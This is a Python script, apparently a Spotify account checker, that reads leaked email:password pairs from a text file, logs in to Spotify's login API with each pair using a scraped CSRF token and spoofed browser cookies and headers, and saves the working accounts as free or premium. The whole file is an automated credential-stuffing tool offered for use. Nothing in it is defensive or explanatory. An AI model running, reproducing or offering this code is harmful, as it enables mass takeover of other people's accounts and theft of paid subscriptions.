import requests
import os.path
from os import path



def getCSRF() :
    csrf_request = requests.get('https://accounts.spotify.com')
    if csrf_request.status_code == 200:
        return csrf_request.cookies.get("csrf_token")

if(path.exists('liste.txt') == True) :
    foundFile = True
else :
    print('HATA: "liste.txt" adlı bir dosya oluşturun ve bu klasöre yerleştirin.')
    exit()


f = open("liste.txt", "r")
listeler = f.read()
if(listeler == '') :
    print('HATA: liste.txt dosyasını açın ve girişleri bu modele yerleştirin jucelino@gmail.com: 1234')
    exit()
listeler = listeler.split('\n')
f.close()

for x in range(len(listeler)):

    liste = listeler[x]
    liste = liste.split(':')

    username = liste[0]
    password = liste[1]


    csrf_token = getCSRF()
    cookies = {"fb_continue" : "https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F", "sp_landing" : "play.spotify.com%2F", "sp_landingref" : "https%3A%2F%2Fwww.google.com%2F", "user_eligible" : "0", "spot" : "%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D", "sp_t" : "ac1439ee6195be76711e73dc0f79f89", "sp_new" : "1", "csrf_token" : csrf_token, "__bon" : "MHwwfC0zMjQyMjQ0ODl8LTEzNjE3NDI4NTM4fDF8MXwxfDE=", "remember" : "false@false.com", "_ga" : "GA1.2.153026989.1498061376", "_gid" : "GA1.2.740264023.1498061376"}
    headers = {"User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36", "Accept" : "application/json, text/plain", "Content-Type": "application/x-www-form-urlencoded"}
    params = {'remember':'true','username':username,'password':password,'csrf_token':csrf_token}


    session = requests.Session()
    req = session.post(url = 'https://accounts.spotify.com/api/login', data = params, cookies = cookies, headers = headers)
    if('displayName' in req.text) :
        listeWorking = True
        req = session.get('https://www.spotify.com/uk/account/subscription/')
        if('Spotify Free' in req.text) :
            free = open("free.txt", "a+")
            print('[FREE] '+username+':'+password)
            free.write(username+':'+password+'\n')
            free.close()
        else :
            premium = open("premium.txt", "a+")
            print('[PREMIUM] '+username+':'+password)
            premium.write(username+':'+password+'\n')
            premium.close()

    else :
        notworking = open("reddedilen.txt", "a+")
        listeWorking = False
        print('[DIE] '+username+':'+password)
        notworking.write(username+':'+password+'\n')
        notworking.close()


